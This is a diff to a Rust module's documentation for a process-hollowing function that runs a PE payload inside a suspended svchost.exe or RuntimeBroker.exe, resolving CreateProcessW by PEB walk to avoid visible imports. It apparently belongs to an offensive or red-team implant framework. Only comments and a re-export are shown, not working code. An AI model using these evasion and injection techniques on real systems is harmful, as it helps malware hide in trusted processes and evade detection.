@@ -8,24 +8,28 @@
 //!
 //! # Platform Support
 //!
-//! Full implementation on Windows; no-op stubs on other platforms.
+//! Full implementation on Windows; returns an error on non-Windows platforms.
 
 pub mod windows_impl;
 
 /// Hollow out a target process and execute a payload in its place.
 ///
-/// Creates a new instance of the target executable in a suspended state,
-/// unmaps its original image, writes the payload, and resumes execution
-/// at the payload's entry point.
+/// Creates a suspended host process (chosen from a prioritised candidate
+/// list such as `svchost.exe`, `RuntimeBroker.exe`, etc.), unmaps its
+/// original image, writes the payload PE, fixes relocations and imports,
+/// and resumes execution at the payload's entry point.
+///
+/// Process creation uses `CreateProcessW` resolved via PEB-walk rather
+/// than IAT-visible API calls.
 ///
 /// # Arguments
 ///
-/// * `target_path` - Path to the legitimate executable to hollow
 /// * `payload` - PE payload bytes to inject
 ///
 /// # Returns
 ///
 /// `Ok(())` on successful injection and execution.
+/// Returns an error on non-Windows platforms.
 pub use windows_impl::hollow_and_execute;
 
 /// Inject shellcode into a running process.
